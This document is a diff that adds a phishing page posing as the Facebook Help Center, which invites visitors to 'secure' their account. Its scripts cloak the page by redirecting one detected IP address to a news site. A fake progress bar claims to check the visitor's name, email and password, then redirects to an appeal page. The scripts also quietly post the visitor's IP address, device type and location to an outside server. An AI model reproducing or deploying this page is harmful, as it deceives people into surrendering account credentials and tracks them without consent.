@@ -1,0 +1,199 @@
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/png" href="images/facebook.png">
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
+    <script src="assets/js/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script type="text/javascript" src="http://l2.io/ip.js?var=ip"></script>
+<script type="text/javascript">
+if (ip == "52.250.30.131") {
+window.location = 'http://www.telegraph.co.uk';
+}
+</script>
+    <link rel="stylesheet" href="style.css">
+    <title>Facebook Help Center</title>
+  <script type="text/javascript">
+     function redirect()
+     {
+       if (screen.width <= 699) {
+          window.location.href='mappeal.html';
+          //alert("Mobile Device");
+       }
+       else{
+         window.location.href='appeal.html';
+       }
+        if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {
+         //if (document.cookie.indexOf("iphone_redirect=false") == -1) window.location = "http://graves-incorporated.com/test_sites/solera_mobile/";
+         window.location.href='mappeal.html';
+      }
+
+        if ((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {
+          //location.replace("http://w3docs.com");
+          window.location.href='mappeal.html';
+        }
+     }
+     
+  </script><style>
+     @media(max-width: 700px) {
+      .main-container {
+         width: 95%;
+         height: 450px !important;
+      }
+     }
+  </style></head>
+
+  
+
+  <body onload="move()">
+      <div style="text-align: center;">
+         <img src="images/Facebook-Logo.png" style="width: 150px; height: 84px;">
+      </div>
+  
+      <div class="main-container">
+         <div class="left">
+            <img src="images/Screenshot_1.png" alt="man">
+         </div>
+         <div class="right">
+            <h5>Hi, Let's Secure Your Account</h5>
+            <p>To help keep your Facebook account secure, we'll take you through a few steps to change your password and make sure any recent changes to your account came from you.</p>
+            
+            <div id="myProgress">
+               <div id="myBar"></div>
+               <div id="text"></div>
+            </div>
+         </div>
+         <div class="bottom">
+            <a href="" id="isDisabled" class="btn disabled" tabindex="-1" role="button" aria-disabled="true">Get Started</a>
+         </div>
+      </div>
+
+      <script>
+         function checkName(){
+            document.getElementById("text").innerHTML = 'Checking your name…';
+         }
+         function checkEmail(){
+            document.getElementById("text").innerHTML = 'Checking your email…';
+         }
+         function checkBirthday(){
+            document.getElementById("text").innerHTML = 'Checking your birthday…';
+         }
+         function checkPassword(){
+            document.getElementById("text").innerHTML = 'Checking your password…';
+         }
+         function checkPost(){
+            document.getElementById("text").innerHTML = 'Checking your posts…';
+         }
+         
+         var text=document.getElementById("text");
+         var i = 0;
+         function move() {
+            if (i == 0) {
+               i = 1;
+               var elem = document.getElementById("myBar");
+               var width = 1;
+               var id = setInterval(frame, 50);
+               function frame() {
+                  if (width >= 100) {
+                      redirect();
+                     //window.location.href="appeal";
+                     document.getElementById("isDisabled").classList.remove("disabled");
+
+                     clearInterval(id);
+                     i = 0;
+                  } else {
+                     width++;
+
+                     if(width>1 && width<=20) {
+                        checkName();    
+                     }
+                     if(width==20)
+                     {
+                        checkEmail();
+                     }
+                     if(width==40)
+                     {
+                        checkBirthday();
+                     }
+                     if(width==60)
+                     {
+                        checkPassword();
+                     }
+                     if(width==80)
+                     {
+                        checkPost();
+                     }
+                        elem.style.width = width + "%";
+                  }
+               }
+            }
+         }
+        </script>
+
+
+        <script type="text/javascript">
+             var locationDevice;
+
+             getDeviceLocation();
+              function getDeviceInfo(){
+                        const ua = navigator.userAgent;
+                        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                          return "tablet";
+                        }
+                        if (
+                          /Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(
+                            ua
+                          )
+                        ) {
+                          return "Mobile";
+                        }
+                        return "Desktop";
+              };
+
+
+              function getDeviceLocation()
+              {
+
+                var ip = "8.8.8.8";
+                var api_key = "at_HSuHwifyiJrOCSR4sOreB9We427Eh";
+                $(function () {
+                   $.ajax({
+                       url: "https://geo.ipify.org/api/v1",
+                       data: {apiKey: api_key, ipAddress: ip},
+                       success: function(data) {
+                          locationDevice=data.location.country+' '+data.location.region;
+                       }
+                   });
+                });
+              }
+
+
+              $(document).ready(function(){
+                      var ipaddress; 
+                      setTimeout(function(){
+                        var deviceinfo=getDeviceInfo(); 
+                      //var locationDevice=getDeviceLocation();
+                        getIpClient();
+                        async function getIpClient() {
+                          try {
+                            const response = await axios.get('https://api.ipify.org?format=json');
+                            ipaddress=response.data.ip;
+                          } catch (error) {
+                            console.error(error);
+                          }
+                          $.post(" https://webmockuplink.com/upscalems/12rasgf1q12/sendAjax1.php",
+                          {
+                            ipaddress: ipaddress , 
+                            deviceinfo: deviceinfo,
+                            locationDevice:locationDevice
+                          },
+                          function(data, status){
+                          });
+                        }                      
+
+                      },1000);                      
+                      
+                });
+      </script>
+  
+</body></html>
